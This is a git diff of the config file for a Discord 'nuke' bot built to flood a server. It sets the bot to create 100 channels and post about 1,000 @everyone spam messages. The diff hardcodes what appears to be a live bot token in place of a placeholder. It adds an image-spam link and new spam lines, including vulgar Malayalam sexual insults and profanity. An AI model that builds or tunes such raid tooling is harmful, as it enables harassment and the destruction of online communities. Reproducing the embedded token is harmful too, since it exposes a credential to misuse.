@@ -1,16 +1,19 @@
-// config.js - ULTRA FAST SETTINGS
+// config.js - ULTRA FAST SETTINGS WITH MALAYALAM SPAM
 require('dotenv').config();
 
 module.exports = {
     // Bot Settings
-    token: process.env.DISCORD_TOKEN || 'YOUR_BOT_TOKEN_HERE',
+    token: process.env.DISCORD_TOKEN || 'MTQ2NDMyNTIzMDg2Nzc3OTU4NA.GInc9I.opbIU_CPeDwEUUegXJODEkq3Sx1em8RGRQu_9c',
     prefix: '!',
     
     // MASSIVE NUKE SETTINGS
     channelName: 'IMPOSTER-network',
-    spamMessage: '@everyone **NUKE BY RICK SER** 💀 @everyone', // Includes @everyone
+    spamMessage: '@everyone **DICK BY IMPOSTER NETWORK** 💀 @everyone',
     channelsToCreate: 100,        // 100 CHANNELS
     messagesPerChannel: 10,        // 10 MESSAGES EACH = 1000 TOTAL MESSAGES
+    
+    // IMAGE SPAM SETTINGS
+    imageUrl: 'https://cdn.discordapp.com/attachments/1432913057922678864/1506750727790526514/image.png',
     
     // ULTRA FAST DELAYS (MINIMAL to maximize speed)
     delays: {
@@ -29,17 +32,17 @@ module.exports = {
     // Bot Status Messages
     statusMessages: [
         '💀 MASS NUKE READY',
-        '🔥 100 CHANNELS',
-        '⚡ 1000 @everyone SPAM',
-        '💀 BY RICK SER'
+        '🔥 1000 MESSAGES INCOMING',
+        '⚡ SINGLE CHANNEL MASSACRE',
+        '💀 XPORDINTE ANDI NEWTONTE AMMEDE VAYIL'
     ],
     
-    // SPAM MESSAGES WITH @EVERYONE
+    // SPAM MESSAGES WITH @EVERYONE - UPDATED MALAYALAM
     spamMessages: [
-        '@everyone 💀 **NUKE BY RICK SER** 💀 @everyone',
-        '@everyone 🔥 **IMPOSTER NETWORK TAKEOVER** 🔥 @everyone',
-        '@everyone ⚡ **100 CHANNELS DESTROYED** ⚡ @everyone',
-        '@everyone 💀 **THIS SERVER IS GONE** 💀 @everyone',
-        '@everyone 🔥 **@EVERYONE SPAM ACTIVE** 🔥 @everyone'
+        '@everyone 🔥 **1000 MESSAGES INCOMING** 🔥 @everyone\n**x9**',
+        '@everyone ⚡ **SINGLE CHANNEL MASSACRE** ⚡ @everyone\n**x9**',
+        '@everyone 💀 **XPORDINTE ANDI NEWTONTE AMMEDE VAYIL** 💀 @everyone\n**x9**',
+        '@everyone 🔥 **ANDI NEWTONTE AMMEDA VAYI** 🔥 @everyone\n**x9**',
+        '@everyone 💀 **DICK BY IMPOSTER NETWORK** 💀 @everyone\n**x9**'
     ]
 };
